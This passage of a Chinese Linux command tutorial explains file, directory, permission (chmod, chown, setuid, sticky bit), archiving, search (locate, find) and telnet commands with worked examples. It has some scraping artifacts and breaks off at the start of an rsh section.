cp命令支持同时复制多个文件，当一次复制多个文件时，目的目录参数必须是一个已经存在的目录，否则将出现错误； cp命令支持同时复制多个文件，当一次复制多个文件时，多个文件用空格分隔。 (1)将当前目录下的一个文件拷贝到一个指定的目录下，文件名为：newFile，目录名为：newDir，则可以使用如下命令： cp newFile newDir (2)将当前目录下的一个文件拷贝到一个指定的目录下并重命名为newFileCpy，文件名为：newFile，目录名为：newDir，则可以使用如下命令： cp newFile newDir&#x2F;newFileCpy (3)将当前目录下的一个文件拷贝到一个指定的目录下并重命名为newFileCpy，文件名为：newFile，目录名为：newDir，则可以使用如下命令： cp newFile newDir&#x2F;newFileCpy 32.Linux重命名文件Linux中使用mv命令来重命名一个文件名。 mv命令还可以用来移动文件，类似于Windows上的剪切功能。 具体命令如下：mv 参数 目录名 常用参数如下： -f：若目标文件与现有的文件重复，则直接覆盖现有的文件； -i：交互式操作，覆盖前先行询问用户，如果源文件与目标文件或目标目录中的文件同名，则询问用户是否覆盖目标文件。用户输入”y”，表示将覆盖目标文件；输入”n”，表示取消对源文件的移动。这样可以避免误将文件覆盖。 具体说明： 如果一次想移动多个文件，则每个文件名用空格隔开； mv命令可以使用通配符来移动目录。 （1）将当前目录下的文件newFile重命名为newFileRename，则可以使用如下命令: mv newFile newFileRename （2）将当前目录下的文件newFileRename移动到一个指定的目录下，目录名为：Dir，则可以使用如下命令： mv newFileRename Dir （3）将当前目录下的文件newFileRename移动到一个指定的目录下并重命名为newFile，目录名为：Dir，则可以使用如下命令： mv newFileRename Dir&#x2F;newFile 32.Linux拷贝目录Linux中使用cp -r命令将一个或多个源目录复制到指定的目录下。它可以将单个源目录复制成一个指定目录名的具体的目录或一个已经存在的目录下。 具体命令如下：cp 参数 源目录 目的目录 常用参数如下： -r 是递归把源目录下的目录递归进行移动； -f：强行复制文件或目录，不论目标文件或目录是否已存在； -i：覆盖既有文件之前先询问用户； -p：保留源文件或目录的属性； 具体说明： cp命令支持同时复制多个目录，当一次复制多个目录时，目的目录参数必须是一个已经存在的目录，否则将出现错误； cp命令支持同时复制多个目录，当一次复制多个目录时，多个目录名用空格分隔； cp命令拷贝目录和拷贝文件大致用法相似，最大差别就是拷贝目录的时候必须加上-r参数，而拷贝文件的时候不需要加-r参数。 33.Linux重命名目录Linux中使用mv命令来重命名一个目录名。 mv命令还可以用来移动目录，类似于Windows上的剪切功能。 具体命令如下：mv 参数 源目录 目的目录 常用参数如下： -f：若目标目录与现有的目录重复，则直接合并现有的目录； -i：交互式操作，覆盖前先行询问用户，如果源目录与目标目录同名，则询问用户是否合并目标目录。用户输入”y”，表示将合并目标目录；输入”n”，表示取消对源目录的移动。这样可以避免误将目录覆盖。 具体说明： 如果一次想移动多个目录，则每个目录名用空格隔开。 mv命令可以使用通配符来移动目录。 mv命令移动目录和移动文件的使用大致一样，唯一不同的是如果出现源目录和目标目录重名，则采用合并的方式，而对于文件则是直接覆盖。 34.Linux查看文件内容Linux中查看文件内容的命令有很多，接下来我们介绍常用的几个命令。 cat命令具体命令如下：cat 参数 文件名 常用参数如下： -n 或 –number：由1开始对所有输出的行数编号； -b 或 –number-nonblank：和-n相似，只不过对于空白行不编号。 具体说明： cat命令支持同时查看多个文件，当一次查看多个文件时，每个文件的内容都会被打印到屏幕上； cat命令不能对文件进行编辑操作，只能查看文件内容。 head命令具体命令如下：head 参数 文件名 常用参数如下： -n number：显示文件的前number行内容； 具体说明： head命令是从文件的开头显示内容，默认情况下只显示前10行的内容； head命令不能对文件进行编辑操作，只能查看文件内容。 tail命令具体命令如下：tail 参数 文件名 常用参数如下： -n number：显示文件的最后number行内容； 具体说明： tail命令是从文件的结尾显示内容，默认情况下只显示最后10行的内容； tail命令不能对文件进行编辑操作，只能查看文件内容。 35.Linux查看目录内容Linux中使用ls命令来查看一个目录下的内容。 具体命令如下：ls 参数 目录 常用参数如下： -a：显示所有档案及目录（ls内定将档案名或目录名称为“.”的视为影藏，不会列出）； -A：显示除隐藏文件“.”和“..”以外的所有文件列表； -l：列出内容的详细信息； -r：以文件名反序排列并输出目录内容列表； -s：显示文件和目录的大小，以区块为单位； -i：显示文件索引节点号（inode）。一个索引节点代表一个文件； -R：递归处理，将指定目录下的所有文件及子目录一并处理。 具体说明： 如果一次查看多个目录，则每个目录名用空格隔开。 36.Linux修改文件权限命令Linux中使用chmod命令来修改文件权限。 文字设定法具体命令如下： chmod ［who］ ［+ | - | &#x3D;］ ［mode] 文件名 who参数如下： u 表示“用户（user）”，即文件或目录的所有者； g 表示“同组（group）用户”，即与文件属主有相同组ID的所有用户； o 表示“其他（others）用户”； a 表示“所有（all）用户”，它是系统默认值。 操作符如下： +：添加某个权限； -：取消某个权限； &#x3D;：赋予给定权限并取消其他所有权限。 mode参数如下： r 可读； w 可写； x 可执行。 数字设定法具体命令如下： chmod ［mode］ 文件名 mode为具体的数字。 首先了解用数字表示的属性的含义：0表示没有权限，1表示可执行权限，2表示可写权限，4表示可读权限，然后将其相加。所以数字属性的格式应为3个从0到7的八进制数，其顺序是u、g和o。 （1）将目录testDir的同组其他用户权限添加可执行权限，同时递归的将该目录下的所有文件或目录都添加可执行权限，可以使用如下命令： chmod -R g+x testDir （2）将目录testDir的权限设置为所有者可读可写可执行，同组用户设置为可读可执行，其他用户设置为可读可执行，可以使用如下命令： chmod 755 testDir 37.Linux修改文件所有者命令Linux中使用chown命令来修改文件所有者。 具体命令如下： 1chown 用户名/用户ID 文件名 执行权限： chown必须以root权限才能执行，如果是普通用户想执行chown时，需要在命令前加sudo命令来提升权限为root权限。 （1）首先创建一个新用户newUser，然后将系统中已存在的文件testFile的所有者设置为newUser，可以使用如下命令: 12sudo useradd newUsersudo chown newUser testFile （2）首先查看用户fzm的ID是多少，然后将系统中已存在的文件testFile的所有者设置为fzm，可以使用如下命令: 12id fzmsudo chown 1000 testFile 38.Linux修改目录所有者命令Linux中使用chown命令来修改目录所有者。 具体命令如下： 1chown 参数 用户名/用户ID 目录名 常见命令参数： -R或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理； --help：在线帮助； 执行权限 chown必须以root权限才能执行，如果是普通用户想执行chown时，需要在命令前加sudo命令来提升权限为root权限。 39.Linux修改文件所属组命令Linux中使用chgrp命令来修改文件所属组。 具体命令如下： 1chgrp 用户组名/组ID 文件名 执行权限 chgrp必须以root权限才能执行，如果是普通用户想执行chgrp时，需要在命令前加sudo命令来提升权限为root权限。 （1）首先创建一个新用户组newGroup，然后将系统中已存在的文件testFile的所属组设置为newGroup，可以使用如下命令: 12sudo groupadd newGroupsudo chgrp newGroup testFile 首先创建一个新用户组newGroup，然后将系统中已存在的文件testFile的所属组设置为newGroup，可以使用如下命令: 1sudo groupadd newGroup` `sudo chgrp newGroup testFile 首先创建一个新用户组newGroup，然后将系统中已存在的文件testFile的所属组设置为newGroup，可以使用如下命令: 1sudo groupadd newGroup` `sudo chgrp newGroup testFile （2）首先通过/etc/group查看用户组fzm的ID是多少，然后将系统中已存在的文件testFile的所属组设置为fzm，可以使用如下命令: 12cat /etc/group | grep fzmsudo chgrp 1000 testFile 40.Linux中也可以使用chown命令来修改文件的所属组。具体命令如下： 1chown:用户组名/组ID 文件名 如果用户想使用chown命令同时修改所有者和所属组信息，则可以使用如下： 1chown 用户名/用户名ID:用户组名/组ID 文件名 执行权限 chgrp必须以root权限才能执行，如果是普通用户想执行chgrp时，需要在命令前加sudo命令来提升权限为root权限。 （1）使用chown命令将系统已存在的文件testFile的所属组设置newGroup，可以使用如下命令: 1sudo chown :newGroup testFile （2）使用chown命令将系统已存在的文件testFile的所有者设置为newUser所属组设置为fzm，可以使用如下命令: 1sudo chown newUser:fzm testFile 41.Linux修改目录所属组命令Linux中使用chgrp命令来修改目录所属组。 具体命令如下： 1chgrp 参数 用户组名/组ID 目录名 常见命令参数： -R或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理； --help：在线帮助； 执行权限 执行权限 chgrp必须以root权限才能执行，如果是普通用户想执行chgrp时，需要在命令前加sudo命令来提升权限为root权限。 42.df命令详解df命令用于显示磁盘分区上的可使用的磁盘空间。默认显示单位为KB。可以利用该命令来获取硬盘被占用了多少空间，目前还剩下多少空间等信息。 具体命令如下： 1df 命令参数 参数 常用参数如下： -a或--all：包含全部的文件系统，包括系统特有的/proc等文件系统; -k : 以KB为单位显示各文件系统; -m : 以MB为单位显示各文件系统; -h : 以可读性较高的方式来显示信息; -i或--inodes：显示inode的信息。 （1）查看系统所有磁盘设备，默认是KB为单位，可以使用如下命令： 1df （2）使用-h选项以KB以上的单位来显示，可读性高，可以使用如下命令： 1df -h （3）将/etc目录下的可用的磁盘容量以易读的格式显示出来，可以使用如下命令： 1df -h /etc 43.du命令详解du命令也是查看使用空间的，但是与df命令不同的是Linux du命令是对文件和目录磁盘使用的空间的查看，还是和df命令有一些区别的。 具体命令如下： 1du 命令参数 参数 常用参数如下： -a : 列出所有的文件与目录容量，因为默认仅统计目录下面的文件量而已; -h : 以可读性较高的方式来显示信息; -k : 以KB为单位显示容量; -m : 以MB为单位显示容量; -s : 列出总量，不列出每个目录占用的容量。 注: 直接输入du命令没有加任何参数时，则du会分析当前所在目录的文件与目录所占用的磁盘空间，但是，实际显示时仅会显示目录容量。 44.Linux链接Linux中的链接类似于Windows的快捷方式，也就是很多的链接文件（link file）其实都指向同一个源文件(source file)。 Linux中链接文件又分为硬链接和软链接两种。 Linux硬链接 硬链接指通过索引节点来进行链接。在Linux的文件系统中，保存在磁盘分区中的文件不管是什么类型都给它分配一个编号，称为索引节点号(Inode Index)。在Linux中，多个文件名指向同一索引节点是存在的。一般这种链接就是硬链接。 硬链接的作用是允许一个文件拥有多个有效路径名，这样用户就可以建立硬链接到重要文件，以防止误删的功能。其原因如上所述，因为对应该目录的索引节点有一个以上的链接。只删除一个链接并不影响索引节点本身和其它的链接，只有当最后一个链接被删除后，文件的数据块及目录的链接才会被释放。也就是说，文件真正删除的条件是与之相关的所有硬链接文件均被删除。 硬链接特点如下： 文件有相同的inode及data block； 只能对已存在的文件进行创建； 不能交叉文件系统进行硬链接的创建； 不能对目录进行创建， 只可对文件创建； 删除一个硬链接文件并不影响其他有相同inode号的文件。 具体命令如下： 1ln 源文件 目标文件 Linux软链接 软链接文件有类似于Windows的快捷方式。它实际上是一个特殊的文件。在符号链接中，文件实际上是一个文本文件，其中包含的有另一文件的位置信息。 与硬链接不同的是，符号链接确实是一个新文件，当然它具有不同的I节点号；而硬链接并没有建立新文件。 软链接特点如下： 源文件和目标文件有不相同的inode及data block； 软链接没有硬链接的限制，可以对目录文件做符号链接； 软链接可以在不同文件系统之间做软链接； 在目录长列表中，符号链接作为一种特殊的文件类型显示出来，其第一个字母是l； 符号链接的大小是其链接文件的路径名中的字节数； 45.setuidsetuid的作用是让执行该命令的用户以该命令拥有者的权限去执行。 例如：普通用户执行passwd时会拥有root的权限，这样就可以修改/etc/passwd这个文件，正是因为passwd命令被设置了setuid权限，passwd命令的详细权限如下所示： 可以看到passwd命令的拥有者的可执行位是s，则说明passwd命令被设置了setuid权限。 设置setuid命令有两种方法，一种是数字设置，另一种是通过助记语法。（建议使用助记语法设置） 数字设置命令：chmod 4xxx 文件/目录 其中xxx表示文件&#x2F;目录的所有者、同组用户和其他用户的权限(读写执行)。 助记语法设置命令：chmod u [+|-] s 文件/目录 1+ 添加setuid权限；- 取消setuid权限； 注意：chmod命令的其他参数都可以与setuid权限设置结合使用。 在设置setuid前必须保证文件&#x2F;目录的所有者具有可执行权限，否则设置则无效。 执行权限：chmod必须以root权限才能执行，如果是普通用户想执行chmod时，需要在命令前加sudo命令来提升权限为root权限。 （1）创建一个新文件testFile，使用数字设置方法为文件testFile添加setuid权限，具体使用如下命令： 1234touch testFilels -l testFilesudo chmod 4764 testFilels -l testFile 第一条命令是创建新文件testFile； 第二条命令是查看testFile现有的权限； 第三条命令是在保证testFile原有权限的情况下为其添加setuid权限； 第四条命令是查看是否添加成功 （2）创建一个新目录testDir，使用助记语法设置方法为目录testDir添加setuid权限，具体使用如下命令： 123mkdir testDirsudo chmod u+s testDirls -l . （3）创建一个新文件testFile，使用助记语法为文件testFile添加setuid权限，具体使用如下命令： 123touch testFilesudo chmod u+x,u+s testFilels -l testFile 第一条命令是创建新文件testFile； 第二条命令是在设置testFile为可执行权限并为其添加setuid权限； 第三条命令是查看是否添加成功； 如果不给文件testFile设置可执行权限直接设置setuid权限后，标记为是S而不是s，详细结果如下图所示： 46.setgidsetgid的作用是让执行该命令的用户以该命令所有者的同组用户的权限去执行。 设置setgid命令有两种方法，一种是数字设置，另一种是通过助记语法。建议使用助记语法设置setgid权限。 数字设置命令： 1chmod 2xxx 文件/目录 其中xxx表示文件&#x2F;目录的所有者、同组用户和其他用户的权限(读写执行)。 助记语法设置命令： 12chmod g [+|-] s 文件/目录+ 添加setgid权限；- 取消setgid权限； 注意：chmod命令的其他参数都可以与setgid权限设置结合使用。 在设置setgid前必须保证文件&#x2F;目录的同组用户具有可执行权限，否则设置则无效。 执行权限：chmod必须以root权限才能执行，如果是普通用户想执行chmod时，需要在命令前加sudo命令来提升权限为root权限。 47.sticky bitsticky bit的作用是让具有sticky bit位的目录下的所有文件&#x2F;目录只有创建者和root才能对其删除和修改，其他用户一律不能删除和修改。 例如：Linux的/tmp目录就具有sticky bit权限，详细权限如下所示： 可以看到/tmp目录的其他用户的可执行位是t，则说明/tmp目录被设置了sticky bit权限。 设置sticky bit命令有两种方法，一种是数字设置，另一种是通过助记语法。建议使用助记语法设置stick bit权限。 数字设置命令：chmod 1xxx 目录 其中xxx表示目录的所有者、同组用户和其他用户的权限（读写执行）。 助记语法设置命令：chmod o [+|-] t 目录 1+ 添加stick bit权限；- 取消stick bit权限； 注意： 1chmod命令的其他参数都可以与stick bit权限设置结合使用。在设置stick bit前必须保证目录的其他用户具有可执行权限，否则设置则无效。stick bit权限只能用于设置目录，不能用于设置文件。 执行权限： chmod必须以root权限才能执行，如果是普通用户想执行chmod时，需要在命令前加sudo命令来提升权限为root权限。 48.chattrchattr的作用是修改文件&#x2F;目录的特殊属性。 具体命令如下： 1chattr [+|-|=] 属性标示符 命令参数 文件/目录 常用命令参数如下： 12-R：递归处理，将指令目录下的所有文件及子目录一并处理；-V：显示指令执行过程；+&lt;属性标示符&gt;：开启文件或目录的该项属性；-&lt;属性标示符&gt;：关闭文件或目录的该项属性；=&lt;属性标示符&gt;：指定文件或目录的该项属性。 常用属性标示符： 1a：让文件或目录仅供附加用途；A：不更新文件或目录的最后存取时间；c：将文件或目录压缩后存放；d：将文件或目录排除在倾倒操作之外；i：不得任意更动文件或目录；s：保密性删除文件或目录；S：即时更新文件或目录；u：预防意外删除。 执行权限：chattr必须以root权限才能执行，如果是普通用户想执行chattr时，需要在命令前加sudo命令来提升权限为root权限。 49.lsattrlsattr的作用查看文件&#x2F;目录的特殊属性设置情况。 具体命令如下： 1lsattr 命令参数 文件/目录 常用参数如下： 123-R：递归的操作方式；-V：显示指令的版本信息；-a：列出目录中的所有文件，包括隐藏文件。 50.tar打包tar命令可以将多个文件&#x2F;目录进行打包，将多个文件生成一个文件，生成的文件后缀为.tar。 具体打包命令如下： 1tar -cvf 生成的tar包名 要打包的文件/目录列表 常用命令参数如下： 1-c 建立新的归档文件；-v 处理过程中输出相关信息；-f 对普通文件操作； 51.tar解包tar命令可以将已经打包好的文件解压出来。 具体打包命令如下： 1tar -xvf 解压包名 -C 解压到指定目录 常用命令参数如下： 1-x 或--ext\\fract或--get：从备份文件中还原文件；-v 处理过程中输出相关信息；-f 对普通文件操作；-C &lt;目的目录&gt; 切换到指定的目录； 如果不使用-C(大写)参数，则默认解压到当前目录下。 52.bzip2bzip2命令用于创建和管理（包括解压缩）.bz2格式的压缩包。 具体命令如下： 1bzip2 命令参数 指定要压缩的文件 常用命令参数如下： 1-z或——compress：强制执行压缩；-d或——decompress：执行解压缩；-f或-force：bzip2在压缩或解压缩时，若输出文件与现有文件同名，预设不会覆盖现有文件。若要覆盖。请使用此参数；-v或——verbose：压缩或解压缩文件时，显示详细的信息； 53.gzipgzip命令用于创建和管理（包括解压缩）.gz格式的压缩包。 具体命令如下： 1gzip 命令参数 指定要压缩的文件 常用命令参数如下： 1-d或--decompress或----uncompress：解开压缩文件；-f或——force：强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接；-l或——list：列出压缩文件的相关信息；-r或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理；-v或——verbose：显示指令执行过程； 54.zipzip命令对文件进行打包操作。zip是个使用广泛的压缩程序，文件经它压缩后会另外产生具有.zip扩展名的压缩文件。 具体命令如下： 1zip 命令参数 指定生成的压缩文件名 要被压缩的文件/目录列表 常用命令参数如下： 123456-d：从压缩文件内删除指定的文件；-q：不显示指令执行过程；-r：递归处理，将指定目录下的所有文件和子目录一并处理；-v：显示指令执行过程或显示版本信息；-u：更换较新的文件到压缩文件内；-x&lt;范本样式&gt;：压缩时排除符合条件的文件； 55.tar命令进行压缩在上一关的学习中，我们学会了使用tar命令对多个文件&#x2F;目录进行打包操作，如果针对多文件&#x2F;目录进行压缩操作时，首先使用tar将其打包生成一个文件，然后使用bzip2和gzip对其进行压缩，那么这里也可以使用tar命令一步就实现对多文件&#x2F;目录进行压缩操作。 采用bzip2方式执行tar命令进行压缩的具体命令如下： 1tar -jcvf 指定生成的压缩文件名 要被压缩的文件/目录列表 常用命令参数如下： 1234-c 建立新的归档文件；-v 处理过程中输出相关信息；-f 对普通文件操作；-j 以bzip2对文件/目录进行压缩； 采用gzip进行压缩的具体命令如下： 1tar -zcvf 指定生成的压缩文件名 要被压缩的文件/目录列表 常用命令参数如下： 1234-c 建立新的归档文件；-v 处理过程中输出相关信息；-f 对普通文件操作；-z 以gzip对文件/目录进行压缩； 56.bunzip2bunzip2命令解压缩由bzip2指令创建的.bz2压缩包。使用bzip2 -d命令也可以将.bz2压缩包进行解压。 具体命令如下： 1bunzip2 命令参数 指定要解压的文件 常用命令参数如下： 1-f或--force：解压缩时，若输出的文件与现有文件同名时，预设不会覆盖现有的文件；-k或——keep：在解压缩后，预设会删除原来的压缩文件。若要保留压缩文件，请使用此参数；-v或——verbose：解压缩文件时，显示详细的信息； 57.gunzipgunzip命令解压缩由gzip指令创建的.gz压缩包。使用gzip -d命令也可以将.gz压缩包进行解压。 具体命令如下： 1gunzip 命令参数 指定要解压的文件 常用命令参数如下： 1-f或-force：强行解开压缩文件，不理会文件名称或硬连接是否存在以及该文件是否为符号连接；-l或-list：列出压缩文件的相关信息；-q或-quiet：不显示警告信息；-r或-recursive：递归处理，将指定目录下的所有文件及子目录一并处理；-v或-verbose：显示指令执行过程； 58.unzipunzip命令用于解压缩由zip命令压缩的.zip压缩包。 具体命令如下： 1unzip 命令参数 指定要解压的文件 常用命令参数如下： 1-q：执行时不显示任何信息；-n：解压缩时不要覆盖原有的文件；-d&lt;目录&gt;：指定文件解压缩后所要存储的目录； 59.tar命令进行解压缩在上一关的学习中，我们学会了使用tar命令对多个文件&#x2F;目录进行打包压缩操作，本关将继续讲解使用tar命令对文件进行解压缩操作。 采用bunzip2进行解压缩的具体命令如下： 1tar -jxvf 指定要解压的文件 常用命令参数如下： 12345-x 或--ext\\fract或--get：从备份文件中还原文件；-v 处理过程中输出相关信息；-f 对普通文件操作；-j 以bunzip2进行解压缩； 采用gzip进行压缩的具体命令如下： 1tar -zxvf 指定要解压的文件 常用命令参数如下： 1234-x 或--ext\\fract或--get：从备份文件中还原文件；-v 处理过程中输出相关信息；-f 对普通文件操作；-z 以gunzip进行解压缩； 60.locatelocate命令用来查找文件或目录。 locate命令要比其他查找文件命令（例如:find）快得多，原因在于它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db。 /var/lib/mlocate/mlocate.db这个数据库中含有本地所有文件信息。Linux 系统自动创建这个数据库，并且每天自动更新一次，因此，我们在用locate查找文件时，有时会找到已经被删除的数据，或者刚刚建立文件，却无法查找到，原因就是因为数据库文件没有被更新。为了避免这种情况，可以在使用locate之前，先使用updatedb命令，手动更新数据库。 接下让我们详细的学习locate和updatedb的使用方法。 locate具体命令如下： 1locate 命令参数 文件/目录 常用命令参数如下： 12345-c, --count 只输出找到的数量；-d, --database DBPATH 使用DBPATH指定的数据库，而不是默认数据库/var/lib/mlocate/mlocate.db；-i, --ignore-case 忽略大小写；-q, --quiet 安静模式，不会显示任何错误讯息；-e, --existing 只显示当前存在的文件条目； 61.updatedbupdatedb命令用来创建或更新locate命令所必需的数据库文件。 updatedb命令的执行过程较长，因为在执行时它会遍历整个系统的目录树，并将所有的文件信息写入locate数据库文件中。 具体命令如下： 1updatedb 命令参数 常用参数如下： 1-o&lt;文件&gt;：忽略默认的数据库文件，使用指定的slocate数据库文件；-U&lt;目录&gt;：更新指定目录的slocate数据库；-v：显示执行的详细过程; 执行权限：updatedb必须以root权限才能执行，如果是普通用户想执行updatedb时，需要在命令前加sudo命令来提升权限为root权限。 62.whichwhich命令(主要是用来查找系统PATH目录下的可执行文件，说白了就是查找那些我们已经安装好的可以直接执行的命令)用于查找并显示给定命令的绝对路径，环境变量PATH中保存了查找命令时需要遍历的目录。which指令会在环境变量$PATH设置的目录里查找符合条件的文件。也就是说，使用which命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。 which是shell内建命令，内建命令要比系统论命令有比较高的执行效率。 具体命令如下： 1which 命令 63.whereiswhereis命令(可以用来查找二进制（命令）、源文件、man文件。与which不同的是这条命令可以是通过文件索引数据库而非PATH来查找的，所以查找的面比which要广)用来定位指令的二进制程序、源代码文件和man手册页等相关文件的路径。 具体命令如下： 1whereis 命令参数 文件名 常用命令参数如下： 12345-b：只查找二进制文件；-B&lt;目录&gt;：只在设置的目录下查找二进制文件；-m：只查找说明文件；-M&lt;目录&gt;：只在设置的目录下查找说明文件；-s：只查找原始代码文件；-S&lt;目录&gt;只在设置的目录下查找原始代码文件； 64.findfind命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。 find命令与locate命令相比各有各的优缺点，**locate命令的优点就是查找速度比find命令快的多，但是缺点也比较明显，locate命令无法查找最新添加的文件&#x2F;目录以及会查找出来已经过期的文件&#x2F;目录。相反find命令的优点就是可以按照自定义的方法查找任何文件，缺点就是查询速度比较慢，因为是通过遍历硬盘来查找而不像locate命令事先建立好数据库来进行查找。** 具体命令如下： 1find 查找目录 查找参数 查找内容 常用查找参数如下： 123456789101112131415161718192021222324-amin&lt;+|-分钟&gt;：查找在指定时间曾被存取过的文件或目录，单位以分钟计算；-atime&lt;+|-24小时数&gt;：查找在指定时间曾被存取过的文件或目录，单位以24小时计算；-cmin&lt;+|-分钟&gt;：查找在指定时间之时被更改过的文件或目录；-ctime&lt;+|-24小时数&gt;：查找在指定时间之时被更改的文件或目录，单位以24小时计算；-mmin&lt;+|-分钟&gt;：查找在指定时间曾被更改过的文件或目录，单位以分钟计算；-mtime&lt;+|-24小时数&gt;：查找在指定时间曾被更改过的文件或目录，单位以24小时计算；-depth：从指定目录下最深层的子目录开始查找；-exec&lt;执行指令&gt;：假设find指令的回传值为True，就执行该指令；-follow：排除符号连接；-gid&lt;群组识别码&gt;：查找符合指定群组识别码的文件或目录；-group&lt;群组名称&gt;：查找符合指定群组名称的文件或目录；-uid&lt;用户识别码&gt;：查找符合指定的用户识别码的文件或目录；-user&lt;拥有者名称&gt;：查找符和指定的拥有者名称的文件或目录；-name&lt;范本样式&gt;：指定字符串作为寻找文件或目录的范本样式；-iname&lt;范本样式&gt;：此参数的效果和指定“-name”参数类似，但忽略字符大小写的差别；-inum&lt;inode编号&gt;：查找符合指定的inode编号的文件或目录；-newer&lt;参考文件或目录&gt;：查找其更改时间较指定文件或目录的更改时间更接近现在的文件或目录；-size&lt;+|-|=文件大小&gt;：查找符合指定的文件大小的文件；-type&lt;文件类型&gt;：只寻找符合指定的文件类型的文件；-a：是前后条件都要满足；-o ：是满足一个条件就好；+：表示大于设置值的文件；- ：表示小于设置值的文件；= ：表示等于设置值的文件； 注意：通常使用find命令的时候使用root权限，这样就有权限查找任何目录下的内容。 （1）查找/etc目录下以my开头以.conf结尾的文件或目录，具体使用如下命令： 1sudo find /etc -name &quot;my*.conf&quot; *表示任意字母。 （2）查找/etc目录下在超过7天前被访问的文件或目录，具体使用如下命令： 1sudo find /etc -atime +7 （3）查找/etc目录下恰好在7天前被访问的文件或目录，具体使用如下命令： 1sudo find /etc -atime 7 （4）查找/etc目录下在5分钟内被访问的文件或目录，具体使用如下命令： 1sudo find /etc -amin -5 -type 文件类型使用方法常见文件类型： 1234567f：普通文件l：符号链接d：目录c：字符设备b：块设备s：套接字p：Fifo （5）查找/etc目录下以my开头的目录，具体使用如下命令： 1sudo find /etc -name &quot;my*&quot; -a -type d size &lt;+|-|=文件大小&gt;使用方法常见文件大小单位： 123456b —— 块（512字节）c —— 字节w —— 字（2字节）k —— 千字节M —— 兆字节G —— 吉字节 （6）查找/etc目录下大于1M的文件，具体使用如下命令： 1sudo find /etc -size +1M -exec使用方法具体使用方法如下： 1find … -exec 要执行的命令 &#123;&#125; \\; -exec选项后面跟随着所要执行的命令或脚本，然后是一个空格一对儿&#123;&#125;一个空格和一个\\;。 注意：要执行的命令和&#123;之间以及&#125;与\\;之间的空格是不能省略的。 （7）查找/etc目录下大于1M的文件&#x2F;目录的详细信息，具体使用如下命令： 1sudo find /etc -size 1M -exec ls -l &#123;&#125; \\; 65.Telnet安装Telnet 协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。 在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个telnet会话，必须输入用户名和密码来登录服务器。 Telnet是常用的远程控制Web服务器的方法。 Linux 系统上提供在线安装软件的功能，前提是确保电脑可以连接上互联网，在线安装软件非常方便，用户只需要对应的软件名称，不需要考虑该软件的依赖情况，在线安装会自动的搜索该软件的所有依赖包，然后自动完成安装。 在线安装是指不需要用户亲自下对应软件的包，但是需要对应系统能够访问互联网，不同的Linux系统使用不同的工具进行在线安装软件，常见的在线安装软件的工具如下所示： 1Ubuntu/Debian系统使用apt-get进行在线安装软件；Redhat/CentOS系统使用yum进行在线安装软件； 安装Telnet服务器本实验环境使用的系统是Ubuntu，所以使用apt-get工具来在线安装软件，具体步骤如下所示： 12更新软件源：sudo apt-get update安装telnet服务器：sudo apt-get install telnetd 如果安装成功则会在/etc/init.d目录下生成一个openbsd-inetd文件： 注意：如果当前用户是root，则执行以上安装命令时不需要加sudo。 安装Telnet客户端本实验环境使用的系统是Ubuntu，所以使用apt-get工具来在线安装软件，具体步骤如下所示： 12更新软件源：sudo apt-get update安装telnet客户端：sudo apt-get install telnet 如果安装成功，我们系统中就会有telnet命令，查看是否存在telnet命令： 注意：只需要更新一次软件源即可，不需要每次安装软件前进行源更新操作。 66.Linux service 命令Linux系统中使用service命令来控制系统服务，它可以启动、停止、重新启动和关闭系统服务，还可以显示所有系统服务的当前状态。 service命令的使用格式： 1service 服务名 控制命令 服务名：自动要控制的服务名，即/etc/init.d目录下的脚本文件名； 控制命令：系统服务脚本支持的控制命令。 常见的控制命令： 1234start：启动该服务；stop：关闭该服务；restart：重新启动该服务；status：查看该服务状态； 注意并不是所有的服务都支持以上4种控制命令，不同的服务提供不同的控制命令，大多数服务都支持以上4种常用的控制命令。 67.Telnet服务管理当我们成功安装Telnet服务器后，接下来，我们使用service命令来管理Telnet服务。 我们将在以下案例演示中分别介绍如何启动、关闭、重新启动Telnet服务，以及查看Telnet服务状态。 （1）查看Telnet服务状态，可以使用如下命令： 1sudo service openbsd-inetd status （2）开启Telnet服务并且查看是否开启成功，可以使用如下命令： 12sudo service openbsd-inetd startsudo service openbsd-inetd status （3）重启Telnet服务并且查看是否重启成功，可以使用如下命令： 12sudo service openbsd-inetd restartsudo service openbsd-inetd status （4）关闭Telnet服务并且查看是否关闭成功，可以使用如下命令： 12sudo service openbsd-inetd stopsudo service openbsd-inetd status 注意：如果当前用户是root，则执行以上命令时不需要加sudo。 68.telnet远程登录服务器telnet 命令格式： 1telnet 选项 参数 常见选项： 12345-a：尝试自动登入远端系统；-b&lt;主机别名&gt;：使用别名指定远端主机名称；-K：不自动登入远端主机；-l&lt;用户名称&gt;：指定要登入远端主机的用户名称；-e&lt;脱离字符&gt;：设置脱离字符； 参数： 1远程主机：指定要登录进行管理的远程主机；端口：指定TELNET协议使用的端口号； （1）使用telnet登录本机，具体使用如下步骤： 1telnet localhost 此时，我们只需要输入远程主机的用户名和密码即可登录成功。 （2）设置脱离符为;，具体使用如下步骤： 1telnet -e &#x27;;&#x27; localhost 可以看到我们将脱离符设置为;后，我们只要登录到远程主机后，当我们想退出的时候我们只需要输入;符号后就自动断开的连接，然后返回到telnet命令模式。接下来我们讲解telnet常见的命令。 69.telnet常见命令当我们执行输入telnet后回车，我们就进行了telnet的命令模式，telnet常见的命令： 12345logout：强制退出远程登录用户并关闭连接；open：新打开一个连接；display：显示当前操作系统参数；quit：退出telnet；z：挂起telnet； （1）远程登录服务器中案例1也可以使用如下方式进行登录，具体使用如下步骤： 12telnettelnet&gt; open localhost （2）使用telnet远程登录本机，并查看远程主机的内核版本号，最后退出登录，具体使用如下步骤： 12345telnet localhost输入用户名输入密码uname -alogout 70.rsh命令rsh命令是&quot;remote shell&quot;（远程 